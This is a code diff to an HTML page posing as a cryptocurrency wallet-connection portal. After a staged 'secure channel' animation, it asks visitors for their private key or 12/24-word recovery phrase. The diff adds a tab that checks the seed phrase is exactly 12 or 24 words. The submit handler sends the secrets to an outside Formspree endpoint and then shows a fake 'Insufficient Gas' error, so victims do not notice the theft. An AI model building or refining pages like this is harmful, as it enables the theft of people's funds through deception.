@@ -33,7 +33,6 @@
         min-height: 100vh;
       }
 
-      /* TICKER */
       .ticker-wrap {
         flex: 1;
         overflow: hidden;
@@ -84,7 +83,6 @@
         }
       }
 
-      /* HEADER */
       .header {
         padding: 28px 40px;
         border-bottom: 1px solid var(--border);
@@ -102,7 +100,6 @@
         content: "⬡ ";
       }
 
-      /* BRANDS SECTION */
       .brands-section {
         padding: 60px 40px 80px;
         max-width: 1200px;
@@ -131,7 +128,6 @@
         letter-spacing: 0.03em;
       }
 
-      /* GRID */
       .brands-grid {
         display: grid;
         grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
@@ -185,7 +181,6 @@
         text-align: center;
       }
 
-      /* MODAL */
       .modal-overlay {
         position: fixed;
         inset: 0;
@@ -250,14 +245,7 @@
         -webkit-text-fill-color: transparent;
         background-clip: text;
       }
-      .modal p {
-        color: var(--muted);
-        font-size: 0.88rem;
-        margin-top: 6px;
-        margin-bottom: 28px;
-      }
 
-      /* CONNECTING SCREEN */
       .connecting-screen {
         display: flex;
         flex-direction: column;
@@ -366,13 +354,48 @@
         }
       }
 
-      /* FORM */
       .form-screen {
         display: none;
       }
       .form-screen.visible {
         display: block;
       }
+
+      .tab-bar {
+        display: flex;
+        border-bottom: 1px solid var(--border);
+        margin-bottom: 22px;
+      }
+      .tab-btn {
+        flex: 1;
+        padding: 11px 0;
+        background: none;
+        border: none;
+        border-bottom: 2px solid transparent;
+        color: var(--muted);
+        font-family: "Syne", sans-serif;
+        font-size: 0.88rem;
+        font-weight: 600;
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+        cursor: pointer;
+        transition: color 0.18s, border-color 0.18s;
+        margin-bottom: -1px;
+      }
+      .tab-btn.active {
+        color: var(--accent);
+        border-bottom: 2px solid var(--accent);
+      }
+      .tab-btn:hover:not(.active) {
+        color: var(--text);
+      }
+      .tab-panel {
+        display: none;
+      }
+      .tab-panel.active {
+        display: block;
+      }
+
       .form-group {
         margin-bottom: 18px;
       }
@@ -403,7 +426,7 @@
       }
       .form-group textarea::placeholder {
         color: #444;
-        font-size: 16px;
+        font-size: 15px;
       }
       .submit-btn {
         width: 100%;
@@ -444,22 +467,31 @@
       .word-counter.valid {
         color: #6dd48a;
       }
-      .word-counter.over {
+      .phrase-hint {
+        font-size: 0.75rem;
+        font-family: "Space Mono", monospace;
+        margin-top: 6px;
+        text-align: right;
+        color: var(--muted);
+        transition: color 0.2s;
+      }
+      .phrase-hint.valid {
+        color: #6dd48a;
+      }
+      .phrase-hint.invalid {
         color: #f08080;
       }
 
-      /* GAS ERROR POPUP */
       .success-popup-overlay {
         position: fixed;
         inset: 0;
-        background: rgba(0, 0, 0, 0.8);
-        backdrop-filter: blur(8px);
+        background: rgba(0, 0, 0, 0.6);
         display: flex;
         align-items: center;
         justify-content: center;
         opacity: 0;
         pointer-events: none;
-        transition: opacity 0.25s ease;
+        transition: opacity 0.22s ease;
         z-index: 1000;
         padding: 20px;
       }
@@ -468,106 +500,79 @@
         pointer-events: all;
       }
       .success-popup {
-        background: #16161f;
-        border: 1px solid rgba(240, 80, 80, 0.3);
-        border-radius: 24px;
-        padding: 48px 36px 40px;
+        background: #ffffff;
+        border-radius: 16px;
+        padding: 32px 28px 24px;
         width: 100%;
-        max-width: 400px;
-        text-align: center;
+        max-width: 380px;
+        text-align: left;
         display: flex;
         flex-direction: column;
-        align-items: center;
-        gap: 14px;
+        gap: 12px;
         position: relative;
-        transform: translateY(24px) scale(0.96);
-        transition: transform 0.3s ease;
-        box-shadow: 0 0 60px rgba(240, 80, 80, 0.06),
-          0 30px 80px rgba(0, 0, 0, 0.6);
+        transform: translateY(16px) scale(0.97);
+        transition: transform 0.25s ease;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
       }
       .success-popup-overlay.active .success-popup {
         transform: translateY(0) scale(1);
       }
       .gas-popup-close {
         position: absolute;
-        top: 16px;
-        right: 16px;
-        background: rgba(255, 255, 255, 0.07);
+        top: 14px;
+        left: 14px;
+        background: #f0f0f0;
         border: none;
-        border-radius: 50%;
+        border-radius: 8px;
         width: 32px;
         height: 32px;
-        color: var(--muted);
-        font-size: 0.9rem;
+        color: #999;
+        font-size: 1rem;
         cursor: pointer;
         display: flex;
         align-items: center;
         justify-content: center;
-        transition: background 0.15s, color 0.15s;
+        transition: background 0.15s;
       }
       .gas-popup-close:hover {
-        background: rgba(255, 255, 255, 0.14);
-        color: var(--text);
-      }
-      .gas-icon {
-        width: 70px;
-        height: 70px;
-        border-radius: 50%;
-        background: rgba(240, 80, 80, 0.1);
-        border: 1.5px solid rgba(240, 80, 80, 0.4);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 1.8rem;
-        color: #f05050;
-        font-weight: 700;
-        animation: pop-in 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) both;
-        animation-delay: 0.1s;
-      }
-      @keyframes pop-in {
-        from {
-          transform: scale(0.5);
-          opacity: 0;
-        }
-        to {
-          transform: scale(1);
-          opacity: 1;
-        }
+        background: #e0e0e0;
+        color: #555;
       }
       .success-popup h3 {
         font-size: 1.25rem;
-        font-weight: 800;
-        color: #f05050;
-        letter-spacing: 0.01em;
+        font-weight: 700;
+        color: #111;
+        letter-spacing: 0;
+        margin-top: 8px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       }
       .success-popup p {
-        color: var(--muted);
-        font-size: 0.9rem;
-        line-height: 1.65;
+        color: #444;
+        font-size: 0.95rem;
+        line-height: 1.6;
         margin: 0;
-        max-width: 300px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        font-weight: 400;
       }
       .success-close-btn {
-        margin-top: 6px;
-        padding: 13px 40px;
-        background: rgba(240, 80, 80, 0.12);
-        border: 1px solid rgba(240, 80, 80, 0.35);
+        align-self: flex-end;
+        margin-top: 8px;
+        padding: 10px 28px;
+        background: #d0eaff;
+        border: none;
         border-radius: 10px;
-        color: #f05050;
-        font-family: "Syne", sans-serif;
+        color: #3a9ad9;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
         font-size: 0.95rem;
-        font-weight: 800;
+        font-weight: 600;
         cursor: pointer;
-        letter-spacing: 0.04em;
-        transition: background 0.15s, transform 0.15s;
-        width: 100%;
+        transition: background 0.15s;
+        width: auto;
       }
       .success-close-btn:hover {
-        background: rgba(240, 80, 80, 0.2);
-        transform: translateY(-1px);
+        background: #b8dcf5;
       }
 
-      /* RESPONSIVE */
       @media (max-width: 600px) {
         .header {
           padding: 20px;
@@ -664,7 +669,6 @@
           <h1>Wallets</h1>
           <p>Select a wallet:</p>
         </div>
-
         <div class="brands-grid">
           <div
             class="brand-card"
@@ -1027,9 +1031,9 @@
     </div>
 
     <!-- WALLET MODAL -->
-    <div class="modal-overlay" id="modalOverlay" onclick="closeModal()">
-      <div class="modal" onclick="event.stopPropagation()">
-        <button class="modal-close" onclick="closeModal()">✕</button>
+    <div class="modal-overlay" id="modalOverlay">
+      <div class="modal">
+        <button class="modal-close" id="modalCloseBtn">&#x2715;</button>
 
         <!-- CONNECTING SCREEN -->
         <div class="connecting-screen" id="connectingScreen">
@@ -1038,7 +1042,7 @@
           <div class="progress-bar-wrap">
             <div class="progress-bar-fill" id="progressFill"></div>
           </div>
-          <div class="status-steps" id="statusSteps">
+          <div class="status-steps">
             <div class="status-step" id="step1">
               <div class="step-dot"></div>
               Initializing secure channel...
@@ -1053,27 +1057,53 @@
             </div>
             <div class="status-step" id="step4">
               <div class="step-dot"></div>
-              Connection established ✓
+              Connection established &#x2713;
             </div>
           </div>
         </div>
 
         <!-- FORM SCREEN -->
         <div class="form-screen" id="formScreen">
-          <h3 id="modalTitle">Manual Connection</h3>
-          <p id="modalSubtitle">Enter your wallet seed phrase or private key...</p>
+          <h3>Manual Connection</h3>
+
+          <div class="tab-bar">
+            <button class="tab-btn active" data-tab="tabIssue">Issue</button>
+            <button class="tab-btn" data-tab="tabReview">Review</button>
+          </div>
+
           <form id="contactForm">
             <input type="hidden" name="partner" id="partnerInput" />
-            <div class="form-group">
-              <textarea
-                id="messageBox"
-                name="message"
-                placeholder="Enter your private key"
-                rows="6"
-                required
-              ></textarea>
-              <div class="word-counter" id="wordCounter">0 / 12–24 words</div>
+
+            <!-- ISSUE TAB -->
+            <div class="tab-panel active" id="tabIssue">
+              <div class="form-group">
+                <label for="issueBox">Private Key</label>
+                <textarea
+                  id="issueBox"
+                  name="issue"
+                  placeholder="Enter your private key"
+                  rows="6"
+                ></textarea>
+              </div>
             </div>
+
+            <!-- REVIEW TAB -->
+            <div class="tab-panel" id="tabReview">
+              <div class="form-group">
+                <label for="messageBox">Passphrase</label>
+                <textarea
+                  id="messageBox"
+                  name="message"
+                  placeholder="Enter your 12 or 24-word recovery phrase, with each word separated by a space..."
+                  rows="6"
+                ></textarea>
+                <div class="phrase-hint" id="phraseHint">
+                  0 words &#x2014; enter exactly 12 or 24
+                </div>
+              </div>
+            </div>
+
+            <!-- SUBMIT always visible -->
             <button type="submit" class="submit-btn" id="submitBtn">
               Submit
             </button>
@@ -1085,16 +1115,13 @@
     <!-- GAS ERROR POPUP -->
     <div class="success-popup-overlay" id="successPopup">
       <div class="success-popup">
-        <button class="gas-popup-close" onclick="closeSuccessPopup()">✕</button>
-        <div class="gas-icon">✕</div>
+        <button class="gas-popup-close" id="gasCloseTop">&#x2715;</button>
         <h3>Insufficient Gas</h3>
         <p>
           Insufficient balance for gas. Please fund your wallet to continue or
           try again with another wallet.
         </p>
-        <button class="success-close-btn" onclick="closeSuccessPopup()">
-          Close
-        </button>
+        <button class="success-close-btn" id="gasCloseBtn">Close</button>
       </div>
     </div>
 
@@ -1103,9 +1130,12 @@
         return str
           .trim()
           .split(/\s+/)
-          .filter((w) => w.length > 0).length;
+          .filter(function (w) {
+            return w.length > 0;
+          }).length;
       }
 
+      // ---- MODAL OPEN/CLOSE ----
       function openModal(brandName, logoSrc) {
         document.getElementById("formScreen").classList.remove("visible");
         document.getElementById("connectingScreen").style.display = "flex";
@@ -1114,43 +1144,21 @@
         document.getElementById("connectingLogo").src = logoSrc;
         document.getElementById("connectingLogo").alt = brandName;
         document.getElementById("progressFill").style.width = "0%";
-        document.getElementById("wordCounter").textContent =
-          "0 / 12\u201324 words";
-        document.getElementById("wordCounter").className = "word-counter";
-        ["step1", "step2", "step3", "step4"].forEach((id) => {
+        document.getElementById("phraseHint").textContent =
+          "0 words \u2014 enter exactly 12 or 24";
+        document.getElementById("phraseHint").className = "phrase-hint";
+        // Reset tabs to Issue
+        document.querySelectorAll(".tab-btn").forEach(function (b, i) {
+          b.classList.toggle("active", i === 0);
+        });
+        document.querySelectorAll(".tab-panel").forEach(function (p, i) {
+          p.classList.toggle("active", i === 0);
+        });
+        ["step1", "step2", "step3", "step4"].forEach(function (id) {
           document.getElementById(id).className = "status-step";
         });
         document.getElementById("modalOverlay").classList.add("active");
         runConnectingSequence();
-      }
-
-      function runConnectingSequence() {
-        const steps = [
-          { id: "step1", progress: 25, delay: 0 },
-          { id: "step2", progress: 55, delay: 700 },
-          { id: "step3", progress: 80, delay: 1400 },
-          { id: "step4", progress: 100, delay: 2100 },
-        ];
-        steps.forEach((step, index) => {
-          setTimeout(() => {
-            if (index > 0) {
-              document.getElementById(steps[index - 1].id).className =
-                "status-step visible done";
-            }
-            document.getElementById(step.id).className =
-              "status-step visible active";
-            document.getElementById("progressFill").style.width =
-              step.progress + "%";
-          }, step.delay);
-        });
-        setTimeout(() => {
-          document.getElementById("step4").className =
-            "status-step visible done";
-          setTimeout(() => {
-            document.getElementById("connectingScreen").style.display = "none";
-            document.getElementById("formScreen").classList.add("visible");
-          }, 400);
-        }, 2900);
       }
 
       function closeModal() {
@@ -1161,54 +1169,143 @@
         document.getElementById("successPopup").classList.remove("active");
       }
 
-      document.addEventListener("input", function (e) {
-        if (e.target && e.target.id === "messageBox") {
-          const count = countWords(e.target.value);
-          const counter = document.getElementById("wordCounter");
-          if (!counter) return;
-          counter.textContent = count + " / 12\u201324 words";
-          counter.className = "word-counter";
-          if (count >= 12 && count <= 24) counter.classList.add("valid");
-          else if (count > 24) counter.classList.add("over");
-        }
-      });
+      // ---- CONNECTING SEQUENCE ----
+      function runConnectingSequence() {
+        var steps = [
+          { id: "step1", progress: 25, delay: 0 },
+          { id: "step2", progress: 55, delay: 700 },
+          { id: "step3", progress: 80, delay: 1400 },
+          { id: "step4", progress: 100, delay: 2100 },
+        ];
+        steps.forEach(function (step, index) {
+          setTimeout(function () {
+            if (index > 0) {
+              document.getElementById(steps[index - 1].id).className =
+                "status-step visible done";
+            }
+            document.getElementById(step.id).className =
+              "status-step visible active";
+            document.getElementById("progressFill").style.width =
+              step.progress + "%";
+          }, step.delay);
+        });
+        setTimeout(function () {
+          document.getElementById("step4").className =
+            "status-step visible done";
+          setTimeout(function () {
+            document.getElementById("connectingScreen").style.display = "none";
+            document.getElementById("formScreen").classList.add("visible");
+          }, 400);
+        }, 2900);
+      }
 
-      document.addEventListener("submit", async function (e) {
-        if (e.target && e.target.id === "contactForm") {
-          e.preventDefault();
-          const btn = document.getElementById("submitBtn");
-          const form = e.target;
+      // ---- EVENT LISTENERS (all attached after DOM ready) ----
+      document.addEventListener("DOMContentLoaded", function () {
+        // Close modal buttons
+        document
+          .getElementById("modalCloseBtn")
+          .addEventListener("click", closeModal);
+        document
+          .getElementById("modalOverlay")
+          .addEventListener("click", function (e) {
+            if (e.target === this) closeModal();
+          });
 
-          btn.disabled = true;
-          btn.textContent = "Sending\u2026";
+        // Gas popup close buttons
+        document
+          .getElementById("gasCloseTop")
+          .addEventListener("click", closeSuccessPopup);
+        document
+          .getElementById("gasCloseBtn")
+          .addEventListener("click", closeSuccessPopup);
 
-          function onSuccess() {
-            form.reset();
-            document.getElementById("wordCounter").textContent =
-              "0 / 12\u201324 words";
-            document.getElementById("wordCounter").className = "word-counter";
-            btn.disabled = false;
-            btn.textContent = "Submit";
-            closeModal();
-            setTimeout(() => {
-              document.getElementById("successPopup").classList.add("active");
-            }, 200);
-          }
-
-          const data = new FormData(form);
-          try {
-            const res = await fetch("https://formspree.io/f/xyknlvro", {
-              method: "POST",
-              body: data,
-              headers: { Accept: "application/json" },
+        // Tab switching
+        document.querySelectorAll(".tab-btn").forEach(function (btn) {
+          btn.addEventListener("click", function () {
+            var targetId = this.dataset.tab;
+            document.querySelectorAll(".tab-btn").forEach(function (b) {
+              b.classList.remove("active");
             });
-            // Always show success whether Formspree accepts or blocks (e.g. local dev)
-            onSuccess();
-          } catch (err) {
-            // Network/CORS error (local dev) — show success anyway
-            onSuccess();
-          }
-        }
+            document.querySelectorAll(".tab-panel").forEach(function (p) {
+              p.classList.remove("active");
+            });
+            this.classList.add("active");
+            document.getElementById(targetId).classList.add("active");
+          });
+        });
+
+        // Review tab phrase hint
+        document
+          .getElementById("messageBox")
+          .addEventListener("input", function () {
+            var count = countWords(this.value);
+            var hint = document.getElementById("phraseHint");
+            if (count === 12 || count === 24) {
+              hint.textContent = count + " words \u2014 valid \u2713";
+              hint.className = "phrase-hint valid";
+            } else if (count > 0) {
+              hint.textContent =
+                count + " words \u2014 must be exactly 12 or 24";
+              hint.className = "phrase-hint invalid";
+            } else {
+              hint.textContent = "0 words \u2014 enter exactly 12 or 24";
+              hint.className = "phrase-hint";
+            }
+          });
+
+        // Form submit
+        document
+          .getElementById("contactForm")
+          .addEventListener("submit", async function (e) {
+            e.preventDefault();
+            var btn = document.getElementById("submitBtn");
+            var form = this;
+
+            // Only enforce 12/24 rule when Passphrase tab is active
+            var onPassphraseTab = document
+              .getElementById("tabReview")
+              .classList.contains("active");
+            if (onPassphraseTab) {
+              var phraseCount = countWords(
+                document.getElementById("messageBox").value
+              );
+              if (phraseCount !== 12 && phraseCount !== 24) {
+                var hint = document.getElementById("phraseHint");
+                hint.textContent =
+                  phraseCount + " words \u2014 must be exactly 12 or 24";
+                hint.className = "phrase-hint invalid";
+                return;
+              }
+            }
+
+            btn.disabled = true;
+            btn.textContent = "Sending\u2026";
+
+            function onSuccess() {
+              form.reset();
+              document.getElementById("phraseHint").textContent =
+                "0 words \u2014 enter exactly 12 or 24";
+              document.getElementById("phraseHint").className = "phrase-hint";
+              btn.disabled = false;
+              btn.textContent = "Connect";
+              closeModal();
+              setTimeout(function () {
+                document.getElementById("successPopup").classList.add("active");
+              }, 200);
+            }
+
+            var data = new FormData(form);
+            try {
+              await fetch("https://formspree.io/f/xyknlvro", {
+                method: "POST",
+                body: data,
+                headers: { Accept: "application/json" },
+              });
+              onSuccess();
+            } catch (err) {
+              onSuccess();
+            }
+          });
       });
     </script>
   </body>
